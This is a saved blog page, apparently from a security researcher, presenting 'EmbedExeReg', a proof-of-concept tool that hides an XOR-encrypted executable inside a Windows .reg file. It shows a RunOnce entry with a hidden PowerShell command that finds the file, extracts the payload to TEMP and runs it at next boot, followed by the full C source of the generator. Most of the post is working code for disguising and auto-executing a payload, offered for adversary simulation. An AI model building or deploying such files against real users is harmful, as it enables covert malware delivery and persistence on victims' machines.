@@ -1,0 +1,583 @@
+
+<!-- saved from url=(0053)https://www.x86matthew.com/view_post?id=embed_exe_reg -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>x86matthew - EmbedExeReg - Embedding an EXE inside a .REG file with automatic execution</title>
+<style>
+.mainLogoImg
+{
+	width: 60px;
+	height: 60px;
+	vertical-align: middle;
+	margin-right: 10px;
+}
+
+.mainContentContainer
+{
+	font-size: 0px;
+}
+
+.baseHeader
+{
+	font-family: 'Lucida Console', Monaco, monospace;
+	color: #40E0D0;
+	height: 60px;
+	padding-left: 10px;
+	padding-right: 10px;
+	line-height: 60px;
+}
+
+.logoContainer
+{
+	font-size: 36px;
+	float: left;
+}
+
+.linkContainer
+{
+	font-size: 16px;
+	float: right;
+}
+
+.mainPage
+{
+	color: #D0FFE8;
+	font-size: 16px;
+	font-family: Verdana, Geneva, sans-serif;
+}
+
+.allPosts
+{
+	border-style: solid;
+	border-width: 1px;
+	border-color: #169B8E;
+	padding: 10px;
+	vertical-align: top;
+}
+
+.mainSectionContainer
+{
+	border-style: solid;
+	border-width: 1px;
+	border-color: #169B8E;
+	padding: 10px;
+}
+
+.sectionTitle
+{
+	font-weight: bold;
+	font-size: 13px;
+	color: #29B3A5;
+}
+
+.allPostsEntry
+{
+	font-size: 12px;
+}
+
+.sectionSplitter
+{
+	display: inline-block;
+	font-size: 14px;
+	vertical-align: top;
+}
+
+.sectionLeft
+{
+	width: 75%;
+}
+
+.sectionRight
+{
+	width: 25%;
+}
+
+.sectionPadding
+{
+	padding: 5px;
+}
+
+.bodyStyle
+{
+	background-color: #2F4F4F;
+	min-width: 850px;
+}
+
+.baseLinkNoUnderline:link
+{
+	text-decoration: none;
+	color: inherit;
+}
+.baseLinkNoUnderline:visited
+{
+	text-decoration: none;
+	color: inherit;
+}
+.baseLinkNoUnderline:hover
+{
+	text-decoration: none;
+	color: inherit;
+}
+.baseLinkNoUnderline:active
+{
+	text-decoration: none;
+	color: inherit;
+}
+
+.baseLink:link
+{
+	text-decoration: underline;
+	color: inherit;
+}
+.baseLink:visited
+{
+	text-decoration: underline;
+	color: inherit;
+}
+.baseLink:hover
+{
+	text-decoration: underline;
+	color: inherit;
+}
+.baseLink:active
+{
+	text-decoration: underline;
+	color: inherit;
+}
+
+.codeBlock
+{
+	background-color: #425F8F;
+	color: white;
+	font-family: 'Lucida Console', Monaco, monospace;
+	border-style: solid;
+	border-width: 1px;
+	border-color: #1e18db;
+	padding: 2px;
+	overflow-x: auto;
+	white-space: pre;
+	font-size: 12px;
+	line-height: 16px;
+}
+
+.codeBlockReduced
+{
+	width: 60%;
+	max-height: 400px;
+}
+
+.codeInline
+{
+	background-color: #4B095E;
+	color: #fff888;
+	font-family: 'Lucida Console', Monaco, monospace; padding: 3px;
+	padding-bottom: 2px;
+}
+
+.previewEnd
+{
+	display: none;
+}
+
+
+.mainPostContent
+{
+	font-size: 13px;
+	line-height: 20px;
+}
+
+</style>
+<script>
+function fixCodeBlocks()
+{
+	var codeBlockList = document.getElementsByClassName('codeBlock');
+	for(var i = 0; i < codeBlockList.length; i++)
+	{
+		var fixedHTML = codeBlockList[i].innerHTML.replace(/<br>/g, '');
+		
+		var ignoreInitialCharacters = 0;
+		for(var ii = 0; ii < fixedHTML.length; ii++)
+		{
+			if(fixedHTML.charAt(ii) == '\r' || fixedHTML.charAt(ii) == '\n')
+			{
+				continue;
+			}
+			
+			ignoreInitialCharacters = ii;
+			break;
+		}
+		
+		codeBlockList[i].innerHTML = fixedHTML.substring(ignoreInitialCharacters);
+	}
+}
+
+document.addEventListener('DOMContentLoaded', function()
+{
+	fixCodeBlocks();
+});
+</script>
+<script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script></head>
+<body class="bodyStyle">
+	
+	<div class="baseHeader">
+		<div class="logoContainer"><a href="https://www.x86matthew.com/" class="baseLinkNoUnderline"><img src="./EmbedExeReg - Embedding an EXE inside a .REG file with automatic execution_files/logo.png" class="mainLogoImg">x86matthew</a></div>
+		<div class="linkContainer"><span style="font-weight: bold;">Twitter:</span> <a href="https://www.twitter.com/x86matthew" class="baseLink" target="_blank">@x86matthew</a> <span style="margin-left: 20px; font-weight: bold;">E-Mail:</span> x86matthew<span>@</span>gmail<span>.</span>com</div>
+	</div>
+
+	
+	<div class="mainPage">
+		<br>
+	
+		<div class="mainContentContainer">
+			<div class="sectionSplitter sectionLeft">
+				<div class="sectionPadding">
+					<div class="mainSectionContainer" style="background-color: #0f393e;">
+						<div style="font-size: 24px; font-weight: bold; color: #5cfd93; margin-bottom: 5px;">EmbedExeReg - Embedding an EXE inside a .REG file with automatic execution</div>
+						<div style="font-size: 13px; color: #9dcc64;">Posted: <span style="font-weight: bold;">26/07/2022</span></div>
+						<br>
+						<div class="mainPostContent">
+							Earlier this year, I released a proof-of-concept project called "EmbedExeLnk" - this tool would generate a Windows link (.lnk) file containing an embedded EXE payload. I have taken this concept further and created a tool that generates a Windows registry (.reg) file containing an EXE payload.<br>
+<br>
+A .reg file contains a plain-text list of registry keys and values to import. This means we can schedule a program to run on the next start-up:<br>
+<br>
+<div class="codeBlock">REGEDIT4
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
+"StartupEntryName"="C:\\test\\program.exe"
+</div><br>
+<br>
+As the <span class="codeInline">Run</span>/<span class="codeInline">RunOnce</span> keys allow parameters to be passed to the target EXE, we can use this to execute scripts. In its simplest form, we could insert a PowerShell command here to download and execute an EXE from a remote server. However, as with the previous .lnk proof-of-concept, I wanted to take it further and not require an additional download.<br>
+<br>
+I started by appending some random binary data to the end of a valid .reg file to see if any errors would be displayed. Luckily, the registry keys were imported correctly and no error messages appeared - it silently failed when the binary data was reached. This means it is safe to append our EXE payload to the end of the .reg file.<br>
+<br>
+Now that we have a .reg file containing the main payload, we need to create a start-up command to execute the embedded program. Since the payload will be executed after the next reboot, the first issue that we will encounter here is that we don't know where the .reg file is stored on the target computer. We don't want to hard-code a specific path, so we will write a PowerShell command to self-locate the .reg file on the hard-drive after rebooting.<br>
+<br>
+The next issue is that we can't execute the payload from the .reg file directly because the EXE data is stored at the end of the file. This means the PowerShell command will also need to extract the EXE data from the .reg file and copy this to a separate .exe file before executing it.<br>
+<br>
+I created a PowerShell command that performed all of the operations listed above - this worked successfully when running it directly from <span class="codeInline">cmd.exe</span>, but didn't execute at all when inserted into a <span class="codeInline">RunOnce</span> registry key. After spending some time investigating this issue, I found that the <span class="codeInline">Run</span>/<span class="codeInline">RunOnce</span> registry keys appear to have a maximum value length of around 256 characters. If a value exceeds this length, it is ignored. My command was over 500 characters long which explains why it wasn't working originally.<br>
+<br>
+There are various routes that can be taken to overcome the command length issue. I decided to add an extra "stage" to the loading chain to allow for maximum flexibility - the .reg file will also contain an embedded .bat file. Most of the logic from the original command will be moved into the .bat data, and the <span class="codeInline">RunOnce</span> value will contain a minimalistic PowerShell command to execute the embedded batch file.<br>
+<br>
+I have also used the same basic XOR encryption for the EXE payload that I wrote for the original EmbedExeLnk project.<br>
+<br>
+The final .reg file will have the following structure:<br>
+<br>
+<div class="codeBlock">&lt;.reg data&gt;
+&lt;.bat data&gt;
+&lt;.exe data&gt;
+</div><br>
+<br>
+Example file:<br>
+<br>
+<div class="codeBlock">REGEDIT4
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
+"startup_entry"="cmd.exe /c \"PowerShell -windowstyle hidden $reg = gci -Path C:\\ -Recurse *.reg ^| where-object {$_.length -eq 0x000E7964} ^| select -ExpandProperty FullName -First 1; $bat = '%temp%\\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^&amp; $bat;\""
+
+\xFF\xFF
+
+cmd /c "PowerShell -windowstyle hidden $file = gc '%temp%\\tmpreg.bat' -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x77 }; $path = '%temp%\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file^| select -Skip 000640)) -Encoding Byte; ^&amp; $path;"
+exit
+
+&lt;encrypted .exe payload data&gt;
+</div><br>
+<br>
+The sample file above can be broken down into 3 parts:<br>
+<br>
+<span style="font-weight: bold;">Original .reg data</span><br>
+<br>
+This creates a value called <span class="codeInline">startup_entry</span> in the <span class="codeInline">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span> key. This will cause the following command to execute when the computer next boots:<br>
+<br>
+<div class="codeBlock">cmd.exe /c "PowerShell -windowstyle hidden $reg = gci -Path C:\ -Recurse *.reg ^| where-object {$_.length -eq 0x000E7964} ^| select -ExpandProperty FullName -First 1; $bat = '%temp%\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^&amp; $bat;"
+</div><br>
+This command searches the C:\ drive for a .reg file that matches the specified file size (<span class="codeInline">0x000E7964</span> in this case) to locate itself. It then copies this .reg file to <span class="codeInline">tmpreg.bat</span> in the TEMP directory and executes it.<br>
+<br>
+The file contains <span class="codeInline">\xFF\xFF</span> after the initial .reg data - this is not strictly necessary but I added it to ensure that the registry import parser fails and stops at this point.<br>
+<br>
+<span style="font-weight: bold;">Embedded .bat data</span><br>
+<br>
+The next block of data contains the embedded .bat commands:<br>
+<br>
+<div class="codeBlock">cmd /c "PowerShell -windowstyle hidden $file = gc '%temp%\\tmpreg.bat' -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x77 }; $path = '%temp%\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file^| select -Skip 000640)) -Encoding Byte; ^&amp; $path;"
+exit
+</div><br>
+This command extracts the main EXE payload from the end of the current file. The offset of the EXE starting point is hardcoded by the generator tool (<span class="codeInline">640</span> bytes in this case). The EXE is copied to the TEMP directory, decrypted, and executed.<br>
+<br>
+Note: When this .bat file is executed, it will also execute the lines in the original .reg file before it reaches the .bat contents. This shouldn't have any adverse effect as they will not be valid commands.<br>
+<br>
+<span style="font-weight: bold;">Embedded .exe data</span><br>
+<br>
+The last block of data contains the encrypted .exe payload.<br>
+<br>
+<img src="./EmbedExeReg - Embedding an EXE inside a .REG file with automatic execution_files/embed_exe_reg.gif" style="width: 60%;"><br>
+<br>
+The main downside to this method is that administrator privileges are required to import .reg files. Another downside is that the main payload doesn't execute until the next reboot, which means it won't execute at all if the user deletes the .reg file before that point. While not good practice, .reg files are often still shared internally via e-mail within organisations for various reasons. This means that they may be useful for adversary simulation operations.<br>
+<br>
+Full code below:<div class="previewEnd"></div><br>
+<br>
+<div class="codeBlock">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+DWORD CreateRegFile(char *pExePath, char *pOutputRegPath)
+{
+	char szRegEntry[1024];
+	char szBatEntry[1024];
+	char szStartupName[64];
+	BYTE bXorEncryptValue = 0;
+	HANDLE hRegFile = NULL;
+	HANDLE hExeFile = NULL;
+	DWORD dwExeFileSize = 0;
+	DWORD dwTotalFileSize = 0;
+	DWORD dwExeFileOffset = 0;
+	BYTE *pCmdLinePtr = NULL;
+	DWORD dwBytesRead = 0;
+	DWORD dwBytesWritten = 0;
+	char szOverwriteSearchRegFileSizeValue[16];
+	char szOverwriteSkipBytesValue[16];
+	BYTE bExeDataBuffer[1024];
+
+	// set xor encrypt value
+	bXorEncryptValue = 0x77;
+
+	// set startup entry name
+	memset(szStartupName, 0, sizeof(szStartupName));
+	strncpy(szStartupName, "startup_entry", sizeof(szStartupName) - 1);
+
+	// generate reg file data (append 0xFF characters at the end to ensure the registry parser breaks after importing the first entry)
+	memset(szRegEntry, 0, sizeof(szRegEntry));
+	_snprintf(szRegEntry, sizeof(szRegEntry) - 1,
+		"REGEDIT4\r\n"
+		"\r\n"
+		"[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\r\n"
+		"\"%s\"=\"cmd.exe /c \\\"powershell -windowstyle hidden $reg = gci -Path C:\\\\ -Recurse *.reg ^| where-object {$_.length -eq 0x00000000} ^| select -ExpandProperty FullName -First 1; $bat = '%%temp%%\\\\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^&amp; $bat;\\\"\"\r\n"
+		"\r\n"
+		"\xFF\xFF\r\n"
+		"\r\n", szStartupName);
+
+	// generate bat file data
+	memset(szBatEntry, 0, sizeof(szBatEntry));
+	_snprintf(szBatEntry, sizeof(szBatEntry) - 1,
+		"cmd /c \"powershell -windowstyle hidden $file = gc '%%temp%%\\\\tmpreg.bat' -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = '%%temp%%\\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file^| select -Skip 000000)) -Encoding Byte; ^&amp; $path;\"\r\n"
+		"exit\r\n", bXorEncryptValue);
+
+	// create output reg file
+	hRegFile = CreateFile(pOutputRegPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if(hRegFile == INVALID_HANDLE_VALUE)
+	{
+		printf("Failed to create output file\n");
+
+		return 1;
+	}
+
+	// open target exe file
+	hExeFile = CreateFile(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if(hExeFile == INVALID_HANDLE_VALUE)
+	{
+		printf("Failed to open exe file\n");
+
+		// error
+		CloseHandle(hRegFile);
+
+		return 1;
+	}
+
+	// store exe file size
+	dwExeFileSize = GetFileSize(hExeFile, NULL);
+
+	// calculate total file size
+	dwTotalFileSize = strlen(szRegEntry) + strlen(szBatEntry) + dwExeFileSize;
+	memset(szOverwriteSearchRegFileSizeValue, 0, sizeof(szOverwriteSearchRegFileSizeValue));
+	_snprintf(szOverwriteSearchRegFileSizeValue, sizeof(szOverwriteSearchRegFileSizeValue) - 1, "0x%08X", dwTotalFileSize);
+
+	// calculate exe file offset
+	dwExeFileOffset = dwTotalFileSize - dwExeFileSize;
+	memset(szOverwriteSkipBytesValue, 0, sizeof(szOverwriteSkipBytesValue));
+	_snprintf(szOverwriteSkipBytesValue, sizeof(szOverwriteSkipBytesValue) - 1, "%06u", dwExeFileOffset);
+
+	// find the offset value of the total reg file length in the command-line arguments
+	pCmdLinePtr = (BYTE*)strstr(szRegEntry, "_.length -eq 0x00000000}");
+	if(pCmdLinePtr == NULL)
+	{
+		// error
+		CloseHandle(hExeFile);
+		CloseHandle(hRegFile);
+
+		return 1;
+	}
+	pCmdLinePtr += strlen("_.length -eq ");
+
+	// update value
+	memcpy((void*)pCmdLinePtr, (void*)szOverwriteSearchRegFileSizeValue, strlen(szOverwriteSearchRegFileSizeValue));
+
+	// find the offset value of the number of bytes to skip in the command-line arguments
+	pCmdLinePtr = (BYTE*)strstr(szBatEntry, "select -Skip 000000)");
+	if(pCmdLinePtr == NULL)
+	{
+		// error
+		CloseHandle(hExeFile);
+		CloseHandle(hRegFile);
+
+		return 1;
+	}
+	pCmdLinePtr += strlen("select -Skip ");
+
+	// update value
+	memcpy((void*)pCmdLinePtr, (void*)szOverwriteSkipBytesValue, strlen(szOverwriteSkipBytesValue));
+
+	// write szRegEntry
+	if(WriteFile(hRegFile, (void*)szRegEntry, strlen(szRegEntry), &amp;dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hExeFile);
+		CloseHandle(hRegFile);
+
+		return 1;
+	}
+
+	// write szBatEntry
+	if(WriteFile(hRegFile, (void*)szBatEntry, strlen(szBatEntry), &amp;dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hExeFile);
+		CloseHandle(hRegFile);
+
+		return 1;
+	}
+
+	// append exe file to the end of the reg file
+	for(;;)
+	{
+		// read data from exe file
+		if(ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &amp;dwBytesRead, NULL) == 0)
+		{
+			// error
+			CloseHandle(hExeFile);
+			CloseHandle(hRegFile);
+
+			return 1;
+		}
+
+		// check for end of file
+		if(dwBytesRead == 0)
+		{
+			break;
+		}
+
+		// "encrypt" the exe file data
+		for(DWORD i = 0; i &lt; dwBytesRead; i++)
+		{
+			bExeDataBuffer[i] ^= bXorEncryptValue;
+		}
+
+		// write data to reg file
+		if(WriteFile(hRegFile, bExeDataBuffer, dwBytesRead, &amp;dwBytesWritten, NULL) == 0)
+		{
+			// error
+			CloseHandle(hExeFile);
+			CloseHandle(hRegFile);
+
+			return 1;
+		}
+	}
+
+	// close exe file handle
+	CloseHandle(hExeFile);
+
+	// close output file handle
+	CloseHandle(hRegFile);
+
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	char *pExePath = NULL;
+	char *pOutputRegPath = NULL;
+
+	printf("EmbedExeReg - www.x86matthew.com\n\n");
+
+	if(argc != 3)
+	{
+		printf("Usage: %s [exe_path] [output_reg_path]\n\n", argv[0]);
+
+		return 1;
+	}
+
+	// get params
+	pExePath = argv[1];
+	pOutputRegPath = argv[2];
+
+	// create a reg file containing the target exe
+	if(CreateRegFile(pExePath, pOutputRegPath) != 0)
+	{
+		printf("Error\n");
+
+		return 1;
+	}
+
+	printf("Finished\n");
+
+	return 0;
+}
+</div><br>
+
+						</div>
+					</div>
+				</div>
+			</div>
+			
+				<div class="sectionSplitter sectionRight">
+					<div class="sectionPadding">
+						<div class="allPosts">
+							<div class="sectionTitle">All Posts</div>
+													<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=embed_exe_reg" class="baseLink">26/07/2022 - EmbedExeReg - Embedding an EXE inside a .REG file with automatic execution</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=add_exe_import" class="baseLink">19/07/2022 - AddExeImport - Add a hardcoded DLL dependency to any EXE</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=proc_env_injection" class="baseLink">13/06/2022 - ProcEnvInjection - Remote code injection by abusing process environment strings</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=import_dll_injection" class="baseLink">10/04/2022 - ImportDLLInjection - An alternative method of injecting DLLs by modifying PE headers in memory</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=audio_transmit" class="baseLink">02/04/2022 - AudioTransmit - Transmitting data between computers using audio</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=eventpipe" class="baseLink">30/03/2022 - EventPipe - An IPC method to transfer binary data between processes using event objects</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=notepadexec" class="baseLink">20/03/2022 - NotepadExec - Using notepad.exe to launch an EXE without code injection</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=ntdll_pipe" class="baseLink">04/03/2022 - NtdllPipe - Using cmd.exe to retrieve a clean version of ntdll.dll</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=ntsockets" class="baseLink">01/03/2022 - NTSockets - Downloading a file via HTTP using the NtCreateFile and NtDeviceIoControlFile syscalls</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=lognt32_p2" class="baseLink">25/02/2022 - LogNT32 - Part 2 - Return-address hijacking implemented to improve efficiency</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=lognt32" class="baseLink">23/02/2022 - LogNT32 - Trace all ntdll function calls without a pre-defined list of headers</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=windows_no_exec" class="baseLink">10/02/2022 - WindowsNoExec - Abusing existing instructions to executing arbitrary code without allocating executable memory</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=stack_scraper" class="baseLink">08/02/2022 - StackScraper - Capturing sensitive data using real-time stack scanning against a remote process</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=hijack_file_handle" class="baseLink">06/02/2022 - HijackFileHandle - Hijack a file in a remote process without code injection</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=create_svc_rpc" class="baseLink">04/02/2022 - CreateSvcRpc - A custom RPC client to execute programs as the SYSTEM user</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=embed_exe_lnk" class="baseLink">04/02/2022 - EmbedExeLnk - Embedding an EXE inside a LNK with automatic execution</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=call_remote_api" class="baseLink">04/02/2022 - CallRemoteAPI - Call functions in remote processes</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=read_write_proc_memory" class="baseLink">02/02/2022 - Reading and writing remote process data without using ReadProcessMemory / WriteProcessMemory</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=system_anti_debug" class="baseLink">01/02/2022 - System-wide anti-debug technique using NtQuerySystemInformation and DuplicateHandle</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=get_eip" class="baseLink">30/01/2022 - Retrieving the current EIP in C/C++</a></div>
+						<br>
+						<div class="allPostsEntry"><a href="https://www.x86matthew.com/view_post?id=settcpentry6" class="baseLink">30/01/2022 - SetTcpEntry6 - A custom SetTcpEntry implementation for IPv6</a></div>
+
+					</div>
+				</div>
+			</div>
+		</div>
+		
+	</div>
+
+
+</body></html>
